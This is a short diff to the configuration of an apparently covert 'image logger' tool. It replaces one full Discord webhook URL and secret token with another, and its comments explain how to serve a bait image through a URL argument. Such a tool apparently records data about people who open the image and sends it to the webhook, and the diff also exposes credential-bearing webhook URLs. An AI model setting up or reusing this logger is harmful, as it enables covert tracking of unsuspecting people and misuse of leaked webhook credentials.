@@ -9,7 +9,7 @@ __author__ = "A2K"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1391060417584828486/egfjaRKktgyFryo-b595yChZvuqkgHGVt1nW2L_lF889A4KngZjS8XiMyGed0wlOgbUL",
+    "webhook": "https://discord.com/api/webhooks/1408557426357047337/iTh5ljcDcw4LMd_JWHWWd9XMCCsz_DmiPjbrYjAQYkaN_L2LEEo1GerVF7JXaspcqDY3",
     "image": "https://raw.githubusercontent.com/meowkurt/api/refs/heads/main/api/aboww.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
